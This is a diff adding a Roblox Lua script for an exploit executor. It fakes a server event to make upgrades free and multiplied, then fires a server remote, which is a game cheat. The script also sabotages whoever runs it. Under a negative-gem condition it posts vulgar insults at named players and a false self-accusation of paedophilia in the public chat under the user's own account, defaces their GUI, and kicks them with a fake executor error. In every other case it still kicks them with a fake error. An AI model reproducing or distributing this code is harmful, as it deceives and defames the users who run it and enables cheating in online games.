@@ -1,0 +1,70 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Remote
+local RemoteEvent = ReplicatedStorage:WaitForChild("RemoteEvent")
+
+-- İlk script: firesignal ile gelen veriyi simüle et
+firesignal(RemoteEvent.OnClientEvent, 
+	{
+		"MultiUpgraded_Handler",
+		{
+			Next_BTMultiplier_Multi = 65536,
+			Next_FSMultiplier_Price = 0,
+			Next_JFMultiplier_Price = 0,
+			Next_MSMultiplier_Price = 0,
+			Next_BTMultiplier_Price = 0,
+			Next_PPMultiplier_Multi = 16384,
+			Next_FSMultiplier_Multi = 32768,
+			Next_MSMultiplier_Multi = 2048,
+			Next_PPMultiplier_Price = 0,
+			Next_JFMultiplier_Multi = 256
+		}
+	}
+)
+
+-- İkinci script: 1 saniye sonra FireServer çağrısı
+task.delay(1, function()
+	local args = {
+		{
+			"StatMultiplier",
+			"FS"
+		}
+	}
+	RemoteEvent:FireServer(unpack(args))
+end)
+
+pcall(function()
+	local player = game.Players.LocalPlayer
+	local tokenValue = player:WaitForChild("PlayerGui")
+		:WaitForChild("ScreenGui")
+		:WaitForChild("CurrentGemImgBtn")
+		:WaitForChild("AmountTxtBtn").Text
+
+	-- String'i sayıya çevir
+	local amount = tonumber(tokenValue)
+
+	if amount and amount < 0 then
+		-- TextChatService üzerinden chat atma
+		local TextChatService = game:GetService("TextChatService")
+
+		TextChatService.TextChannels.RBXGeneral:SendAsync("Jitem Benim A*ıma Koydu :(")
+		TextChatService.TextChannels.RBXGeneral:SendAsync("I'm Pedophile")
+		TextChatService.TextChannels.RBXGeneral:SendAsync("Umutne74'ün ve 1xElqueen'in dassaklarunu yerum")-- 0'dan küçükse yapılacak işlem
+		print("Amount negatif! İşlem yapılıyor...")
+		i = 0
+		while i <= 5 do 
+			game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.CurrentGemImgBtn.AmountTxtBtn.Text = "JITEM BABA SIKER" 
+			i = i+1
+			task.wait(0.1)
+		end
+
+		task.wait(5)-- örnek: oyuncunun HP'sini azalt
+		LocalPlayer:Kick("Executor Error : NumberValue Undefined <0 💗")
+	else
+		print("Amount geçerli: " .. amount)
+		LocalPlayer:Kick("Executor Error : Update The Executor.")
+	end
+end)
+-- 5 saniye sonra oyuncuyu oyundan at
